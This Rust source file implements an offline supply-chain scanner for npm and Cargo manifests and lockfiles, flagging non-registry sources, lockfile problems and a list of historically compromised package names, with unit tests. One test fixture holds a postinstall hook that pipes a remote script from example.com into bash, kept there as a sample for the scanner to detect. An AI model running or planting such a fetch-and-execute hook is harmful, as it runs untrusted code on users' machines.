//! Read-only supply-chain checks for project manifests and lockfiles.
//!
//! The scanner deliberately works offline. Dependency source checks and the
//! compromised-package list are conservative signals for review; they are not
//! a replacement for an advisories database or a package manager audit.

use std::{fs, path::Path};

use serde_json::Value;

use crate::{
    audit_tool,
    error::{DustError, DustResult},
    fs::walk_dirs,
    lockfile,
    models::{
        Ecosystem, LockfileCheck, LockfileKind, LockfileStatus, RiskLevel, SecurityFinding,
        SecurityFindingKind, SecurityReport,
    },
};

const NODE_DEPENDENCY_SECTIONS: &[&str] = &[
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
];

const KNOWN_COMPROMISED_PACKAGES: &[&str] = &[
    // Historical npm compromise and protestware incidents. The package name
    // is intentionally enough to produce a review finding because a lockfile
    // may not expose an affected version in every supported format.
    "babelcli",
    "coa",
    "crossenv",
    "eslint-scope",
    "event-stream",
    "flatmap-stream",
    "node-ipc",
    "rc",
    "ua-parser-js",
];

/// Runs the complete offline security scan for the selected ecosystems.
pub fn scan(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<SecurityReport> {
    walk_dirs(root)?;

    let scan_node = ecosystems.is_empty() || ecosystems.contains(&Ecosystem::Node);
    let scan_rust = ecosystems.is_empty() || ecosystems.contains(&Ecosystem::Rust);

    if !scan_node && !scan_rust {
        return Ok(SecurityReport::default());
    }

    let mut report = SecurityReport::default();

    if scan_node {
        report.lifecycle_warnings = audit_tool::security_scan(root)?;

        for warning in &report.lifecycle_warnings {
            report.findings.push(SecurityFinding::new(
                root.join("package.json"),
                SecurityFindingKind::SuspiciousScript,
                Some(warning.package.clone()),
                warning.risk_level,
                Some(warning.command.clone()),
                format!(
                    "{} Lifecycle hook: {}.",
                    warning.reason, warning.script_type
                ),
            ));
        }

        let package_json = root.join("package.json");
        if package_json.is_file() {
            scan_package_manifest(&package_json, &mut report)?;
        }
    }

    if scan_rust {
        let cargo_toml = root.join("Cargo.toml");
        if cargo_toml.is_file() {
            scan_cargo_manifest(&cargo_toml, &mut report)?;
        }
    }

    let mut lockfiles = check_relevant_lockfiles(root, scan_node, scan_rust)?;
    lockfiles.retain(|check| {
        (scan_node && check.kind.ecosystem() == Ecosystem::Node)
            || (scan_rust && check.kind.ecosystem() == Ecosystem::Rust)
    });

    for check in &lockfiles {
        report_lockfile_status(check, &mut report);

        if check.status != LockfileStatus::Missing {
            scan_lockfile(check, &mut report)?;
        }
    }

    report.lockfiles = lockfiles;
    Ok(report)
}

fn check_relevant_lockfiles(
    root: &Path,
    scan_node: bool,
    scan_rust: bool,
) -> DustResult<Vec<LockfileCheck>> {
    if scan_node && root.join("package.json").is_file() {
        return lockfile::check_lockfile_integrity(root);
    }

    let expected = if scan_rust && root.join("Cargo.toml").is_file() {
        vec![LockfileKind::CargoLock]
    } else {
        Vec::new()
    };

    lockfile::check_lockfiles(root, &expected)
}

fn scan_package_manifest(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let manifest: Value =
        serde_json::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    report.manifests.push(path.to_path_buf());

    for section in NODE_DEPENDENCY_SECTIONS {
        let Some(dependencies) = manifest.get(*section).and_then(Value::as_object) else {
            continue;
        };

        for (name, specification) in dependencies {
            inspect_node_dependency(path, name, specification.as_str(), report);
        }
    }

    if let Some(bundled) = manifest
        .get("bundledDependencies")
        .and_then(Value::as_array)
    {
        for name in bundled.iter().filter_map(Value::as_str) {
            report_known_package(path, name, report);
        }
    }

    Ok(())
}

fn inspect_node_dependency(
    path: &Path,
    name: &str,
    specification: Option<&str>,
    report: &mut SecurityReport,
) {
    report_known_package(path, name, report);

    let Some(specification) = specification else {
        return;
    };

    if let Some(source) = untrusted_node_source(specification) {
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            Some(name.to_owned()),
            RiskLevel::Medium,
            Some(specification.to_owned()),
            format!(
                "Dependency uses a non-registry source ({source}); review and pin the source before installation."
            ),
        );
    }
}

fn scan_cargo_manifest(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let manifest: toml::Value =
        toml::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    report.manifests.push(path.to_path_buf());
    inspect_cargo_tables(path, &manifest, report);
    Ok(())
}

fn inspect_cargo_tables(path: &Path, value: &toml::Value, report: &mut SecurityReport) {
    let Some(table) = value.as_table() else {
        return;
    };

    for (key, value) in table {
        if is_cargo_dependency_section(key)
            && let Some(dependencies) = value.as_table()
        {
            for (name, specification) in dependencies {
                inspect_cargo_dependency(path, name, specification, report);
            }
        }

        inspect_cargo_tables(path, value, report);
    }
}

fn inspect_cargo_dependency(
    path: &Path,
    name: &str,
    specification: &toml::Value,
    report: &mut SecurityReport,
) {
    let package_name = specification
        .get("package")
        .and_then(toml::Value::as_str)
        .unwrap_or(name);
    report_known_package(path, package_name, report);

    let Some((source, detail)) = untrusted_cargo_source(specification) else {
        return;
    };

    report.finding(
        path,
        SecurityFindingKind::UntrustedDependency,
        Some(package_name.to_owned()),
        RiskLevel::Medium,
        Some(detail.to_owned()),
        format!(
            "Cargo dependency uses a non-crates.io source ({source}); review the source and pin the revision."
        ),
    );
}

fn report_known_package(path: &Path, name: &str, report: &mut SecurityReport) {
    if !is_known_compromised_package(name) {
        return;
    }

    report.finding(
        path,
        SecurityFindingKind::KnownMaliciousPackage,
        Some(name.to_owned()),
        RiskLevel::Critical,
        None,
        "Package name matches DustFril's built-in list of historically compromised packages; verify the exact version and replace it if affected.",
    );
}

fn report_lockfile_status(check: &LockfileCheck, report: &mut SecurityReport) {
    let (kind, risk_level, reason) = match check.status {
        LockfileStatus::Missing => (
            SecurityFindingKind::MissingLockfile,
            RiskLevel::High,
            "Expected lockfile is missing; dependency resolution is not reproducible.",
        ),
        LockfileStatus::Modified => (
            SecurityFindingKind::ModifiedLockfile,
            RiskLevel::High,
            "Lockfile differs from the committed Git state; review the dependency changes before installation.",
        ),
        LockfileStatus::Untracked => (
            SecurityFindingKind::UntrackedLockfile,
            RiskLevel::Medium,
            "Lockfile is not tracked by Git; dependency resolution can change without review.",
        ),
        LockfileStatus::Clean => return,
    };

    report.finding(
        &check.path,
        kind,
        None,
        risk_level,
        Some(check.status.to_string()),
        format!("{} ({})", reason, check.kind),
    );
}

fn scan_lockfile(check: &LockfileCheck, report: &mut SecurityReport) -> DustResult<()> {
    match check.kind {
        LockfileKind::PackageLockJson => scan_package_lock(&check.path, report),
        LockfileKind::PnpmLockYaml => scan_pnpm_lock(&check.path, report),
        LockfileKind::BunLock => scan_bun_lock(&check.path, report),
        LockfileKind::CargoLock => scan_cargo_lock(&check.path, report),
    }
}

fn scan_package_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile: Value =
        serde_json::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    if let Some(packages) = lockfile.get("packages").and_then(Value::as_object) {
        for (key, package) in packages {
            let Some(package) = package.as_object() else {
                continue;
            };
            let name = package
                .get("name")
                .and_then(Value::as_str)
                .or_else(|| package_name_from_selector(key));
            let Some(name) = name else { continue };
            if key.is_empty() && package.get("version").is_none() {
                continue;
            }

            let source = package
                .get("resolved")
                .or_else(|| package.get("resolvedUrl"))
                .and_then(Value::as_str);
            inspect_node_lock_dependency(path, name, source, report);
        }
    }

    if let Some(dependencies) = lockfile.get("dependencies").and_then(Value::as_object) {
        inspect_npm_dependency_tree(path, dependencies, report);
    }

    Ok(())
}

fn inspect_npm_dependency_tree(
    path: &Path,
    dependencies: &serde_json::Map<String, Value>,
    report: &mut SecurityReport,
) {
    for (name, dependency) in dependencies {
        let source = dependency
            .get("resolved")
            .or_else(|| dependency.get("resolvedUrl"))
            .and_then(Value::as_str);
        inspect_node_lock_dependency(path, name, source, report);

        if let Some(nested) = dependency.get("dependencies").and_then(Value::as_object) {
            inspect_npm_dependency_tree(path, nested, report);
        }
    }
}

fn inspect_node_lock_dependency(
    path: &Path,
    name: &str,
    source: Option<&str>,
    report: &mut SecurityReport,
) {
    report_known_package(path, name, report);

    let Some(source) = source else { return };
    if !is_trusted_node_registry(source) {
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            Some(name.to_owned()),
            RiskLevel::Medium,
            Some(source.to_owned()),
            "Dependency lock entry resolves outside the supported public npm registries; review the artifact source.",
        );
    }
}

fn scan_pnpm_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let mut in_packages = false;
    let mut current_package: Option<String> = None;

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed == "packages:" {
            in_packages = true;
            current_package = None;
            continue;
        }

        if in_packages && !line.starts_with(' ') && !line.starts_with('\t') {
            in_packages = false;
            current_package = None;
        }

        if !in_packages {
            continue;
        }

        let indentation = line
            .chars()
            .take_while(|character| character.is_whitespace())
            .count();
        if indentation == 2 && trimmed.ends_with(':') {
            let selector = trimmed[..trimmed.len() - 1]
                .trim_matches(['\'', '"'])
                .trim_start_matches('/');
            current_package = package_name_from_selector(selector).map(str::to_owned);

            if let Some(name) = current_package.as_deref() {
                report_known_package(path, name, report);
                if let Some(source) = untrusted_node_source(selector) {
                    report.finding(
                        path,
                        SecurityFindingKind::UntrustedDependency,
                        Some(name.to_owned()),
                        RiskLevel::Medium,
                        Some(selector.to_owned()),
                        format!(
                            "pnpm lock entry uses a non-registry source ({source}); review the resolved package."
                        ),
                    );
                }
            }
            continue;
        }

        let Some(name) = current_package.as_deref() else {
            continue;
        };
        if let Some(source) = yaml_value_after(trimmed, "tarball:")
            && !is_trusted_node_registry(source)
        {
            report.finding(
                path,
                SecurityFindingKind::UntrustedDependency,
                Some(name.to_owned()),
                RiskLevel::Medium,
                Some(source.to_owned()),
                "pnpm lock entry downloads from outside the supported public npm registries; review the artifact source.",
            );
        }
    }

    Ok(())
}

fn scan_bun_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let Ok(lockfile) = serde_json::from_str::<Value>(&content) else {
        // Bun has used more than one lockfile representation. A non-JSON
        // lockfile is still checked for presence and Git status above.
        return Ok(());
    };

    if let Some(packages) = lockfile.get("packages") {
        inspect_bun_value(path, packages, None, report);
    }
    if let Some(workspaces) = lockfile.get("workspaces") {
        inspect_bun_value(path, workspaces, None, report);
    }

    Ok(())
}

fn inspect_bun_value(path: &Path, value: &Value, hint: Option<&str>, report: &mut SecurityReport) {
    match value {
        Value::Object(object) => {
            let package_name = object
                .get("name")
                .and_then(Value::as_str)
                .or(hint)
                .filter(|name| !is_lock_metadata_key(name));

            if let Some(name) = package_name {
                report_known_package(path, name, report);
                for key in ["resolved", "tarball", "url"] {
                    if let Some(source) = object.get(key).and_then(Value::as_str)
                        && !is_trusted_node_registry(source)
                    {
                        report.finding(
                            path,
                            SecurityFindingKind::UntrustedDependency,
                            Some(name.to_owned()),
                            RiskLevel::Medium,
                            Some(source.to_owned()),
                            "Bun lock entry resolves outside the supported public npm registries; review the artifact source.",
                        );
                    }
                }
            }

            for (key, child) in object {
                let child_hint = package_name_from_selector(key).or(package_name);
                inspect_bun_value(path, child, child_hint, report);
            }
        }
        Value::Array(array) => {
            for child in array {
                if let Some(selector) = child.as_str()
                    && let Some(name) = package_name_from_selector(selector)
                {
                    report_known_package(path, name, report);
                    if let Some(source) = untrusted_node_source(selector) {
                        report.finding(
                            path,
                            SecurityFindingKind::UntrustedDependency,
                            Some(name.to_owned()),
                            RiskLevel::Medium,
                            Some(selector.to_owned()),
                            format!(
                                "Bun lock entry uses a non-registry source ({source}); review the resolved package."
                            ),
                        );
                    }
                }
                inspect_bun_value(path, child, hint, report);
            }
        }
        Value::String(selector) => {
            if let Some(name) = package_name_from_selector(selector) {
                report_known_package(path, name, report);
            }
        }
        _ => {}
    }
}

fn scan_cargo_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile: toml::Value =
        toml::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    let Some(packages) = lockfile.get("package").and_then(toml::Value::as_array) else {
        return Ok(());
    };

    for package in packages {
        let Some(name) = package.get("name").and_then(toml::Value::as_str) else {
            continue;
        };
        report_known_package(path, name, report);

        let Some(source) = package.get("source").and_then(toml::Value::as_str) else {
            continue;
        };
        if !is_trusted_cargo_registry(source) {
            report.finding(
                path,
                SecurityFindingKind::UntrustedDependency,
                Some(name.to_owned()),
                RiskLevel::Medium,
                Some(source.to_owned()),
                "Cargo lock entry resolves outside crates.io; review the source and pinned revision.",
            );
        }
    }

    Ok(())
}

impl SecurityReport {
    fn finding(
        &mut self,
        path: &Path,
        kind: SecurityFindingKind,
        package: Option<String>,
        risk_level: RiskLevel,
        evidence: Option<String>,
        reason: impl Into<String>,
    ) {
        let finding = SecurityFinding::new(
            path.to_path_buf(),
            kind,
            package,
            risk_level,
            evidence,
            reason,
        );

        if !self.findings.contains(&finding) {
            self.findings.push(finding);
        }
    }
}

fn is_cargo_dependency_section(key: &str) -> bool {
    matches!(
        key,
        "dependencies" | "dev-dependencies" | "build-dependencies"
    )
}

fn untrusted_node_source(specification: &str) -> Option<&'static str> {
    let value = specification.trim().to_ascii_lowercase();
    if value.starts_with("git+")
        || value.starts_with("git:")
        || value.starts_with("git@")
        || value.starts_with("github:")
    {
        return Some("Git or GitHub source");
    }
    if value.starts_with("http://") {
        return Some("HTTP URL");
    }
    if value.starts_with("https://") && !is_trusted_node_registry(&value) {
        return Some("HTTPS URL");
    }
    if value.starts_with("file:")
        || value.starts_with("link:")
        || value.starts_with("workspace:")
        || value.starts_with("./")
        || value.starts_with("../")
    {
        return Some("local or workspace source");
    }
    if value.split('/').count() == 2 && !value.chars().any(char::is_whitespace) {
        return Some("repository shorthand");
    }

    None
}

fn untrusted_cargo_source(specification: &toml::Value) -> Option<(&'static str, &str)> {
    if let Some(table) = specification.as_table() {
        if let Some(value) = table.get("git").and_then(toml::Value::as_str) {
            return Some(("Git source", value));
        }
        if let Some(value) = table.get("path").and_then(toml::Value::as_str) {
            return Some(("local path", value));
        }
        if let Some(value) = table.get("url").and_then(toml::Value::as_str) {
            return Some(("URL source", value));
        }
        if let Some(value) = table.get("registry").and_then(toml::Value::as_str)
            && value != "crates-io"
        {
            return Some(("alternate registry", value));
        }
        return None;
    }

    let value = specification.as_str()?;
    if value.starts_with("git+") || value.starts_with("http://") || value.starts_with("https://") {
        return Some(("URL source", value));
    }
    None
}

fn is_known_compromised_package(name: &str) -> bool {
    KNOWN_COMPROMISED_PACKAGES
        .iter()
        .any(|known| known.eq_ignore_ascii_case(name.trim()))
}

fn is_trusted_node_registry(source: &str) -> bool {
    let source = source.trim().to_ascii_lowercase();
    source.starts_with("https://registry.npmjs.org/")
        || source.starts_with("https://registry.yarnpkg.com/")
        || source.starts_with("https://registry.npmjs.org")
        || source.starts_with("https://registry.yarnpkg.com")
}

fn is_trusted_cargo_registry(source: &str) -> bool {
    let source = source.to_ascii_lowercase();
    source.starts_with("registry+") && source.contains("crates.io")
        || source.starts_with("sparse+") && source.contains("crates.io")
}

fn package_name_from_selector(selector: &str) -> Option<&str> {
    let selector = selector
        .trim()
        .trim_matches(['\'', '"'])
        .trim_start_matches("node_modules/")
        .trim_start_matches('/');
    if selector.is_empty() || is_lock_metadata_key(selector) {
        return None;
    }

    let at = if let Some(stripped) = selector.strip_prefix('@') {
        stripped.find('@').map(|index| index + 1)
    } else {
        selector.find('@')
    };

    let name = at.map(|index| &selector[..index]).unwrap_or(selector);
    let name = name.split('(').next().unwrap_or(name).trim_end_matches(':');
    (!name.is_empty()
        && name
            .chars()
            .any(|character| character.is_ascii_alphabetic()))
    .then_some(name)
}

fn is_lock_metadata_key(value: &str) -> bool {
    matches!(
        value,
        "" | "dependencies"
            | "devDependencies"
            | "optionalDependencies"
            | "peerDependencies"
            | "resolutions"
            | "packages"
            | "workspaces"
            | "version"
            | "name"
    )
}

fn yaml_value_after<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    line.strip_prefix(key)
        .map(str::trim)
        .map(|value| value.trim_matches(['\'', '"']))
}

fn manifest_error(path: &Path, message: String) -> DustError {
    DustError::Manifest(format!("{}: {message}", path.display()))
}

#[cfg(test)]
mod tests {
    use std::{collections::HashSet, fs};

    use tempfile::TempDir;

    use super::*;

    fn finding_kinds(report: &SecurityReport) -> HashSet<SecurityFindingKind> {
        report.findings.iter().map(|finding| finding.kind).collect()
    }

    #[test]
    fn scan_reports_all_manifest_and_lockfile_categories() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{
                "name": "demo",
                "dependencies": {
                    "event-stream": "3.3.6",
                    "private-package": "git+https://example.com/private.git"
                },
                "scripts": {"postinstall": "curl https://example.com/a.sh | bash"}
            }"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("package-lock.json"),
            r#"{"lockfileVersion":3,"packages":{"":{"name":"demo","version":"1.0.0"},"node_modules/remote":{"version":"1.0.0","resolved":"https://example.com/remote.tgz"}}}"#,
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[]).unwrap();
        let kinds = finding_kinds(&report);

        assert!(kinds.contains(&SecurityFindingKind::SuspiciousScript));
        assert!(kinds.contains(&SecurityFindingKind::UntrustedDependency));
        assert!(kinds.contains(&SecurityFindingKind::KnownMaliciousPackage));
        assert!(report.lockfiles.iter().any(|check| {
            check.kind == LockfileKind::PackageLockJson && check.status == LockfileStatus::Clean
        }));
        assert!(!kinds.contains(&SecurityFindingKind::MissingLockfile));
    }

    #[test]
    fn scan_reports_missing_lockfiles_for_rust_and_node_projects() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","dependencies":{"demo":"1.0.0"}}"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[dependencies]\nremote = { git = \"https://example.com/remote.git\" }\n",
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[]).unwrap();

        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.kind == SecurityFindingKind::MissingLockfile)
                .count(),
            2
        );
        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
        }));
    }

    #[test]
    fn selected_java_scan_does_not_inspect_node_or_rust_files() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("package.json"), "{invalid json").unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Java]).unwrap();

        assert!(report.findings.is_empty());
        assert!(report.manifests.is_empty());
    }

    #[test]
    fn scan_reads_pnpm_and_bun_lock_package_entries() {
        let pnpm_dir = TempDir::new().unwrap();
        fs::write(
            pnpm_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"pnpm@9.0.0"}"#,
        )
        .unwrap();
        fs::write(
            pnpm_dir.path().join("pnpm-lock.yaml"),
            "lockfileVersion: '9.0'\npackages:\n  event-stream@3.3.6:\n    resolution: {integrity: sha512-example}\n",
        )
        .unwrap();

        let pnpm_report = scan(pnpm_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(pnpm_report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::KnownMaliciousPackage
                && finding.package.as_deref() == Some("event-stream")
        }));

        let bun_dir = TempDir::new().unwrap();
        fs::write(
            bun_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"bun@1.0.0"}"#,
        )
        .unwrap();
        fs::write(
            bun_dir.path().join("bun.lock"),
            r#"{"lockfileVersion":1,"packages":{"event-stream":["event-stream@3.3.6",{"integrity":"sha512-example"}]}}"#,
        )
        .unwrap();

        let bun_report = scan(bun_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(bun_report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::KnownMaliciousPackage
                && finding.package.as_deref() == Some("event-stream")
        }));
    }

    #[test]
    fn scan_reads_cargo_lock_package_sources() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[dependencies]\nremote = { git = \"https://example.com/remote.git\" }\n",
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("Cargo.lock"),
            "version = 3\n\n[[package]]\nname = \"remote\"\nversion = \"1.0.0\"\nsource = \"git+https://example.com/remote.git\"\n",
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Rust]).unwrap();

        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
        }));
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.kind == SecurityFindingKind::MissingLockfile)
        );
    }

    #[test]
    fn package_selector_supports_scoped_and_unscoped_names() {
        assert_eq!(
            package_name_from_selector("@scope/package@1.0.0"),
            Some("@scope/package")
        );
        assert_eq!(
            package_name_from_selector("/event-stream@3.3.6"),
            Some("event-stream")
        );
    }
}
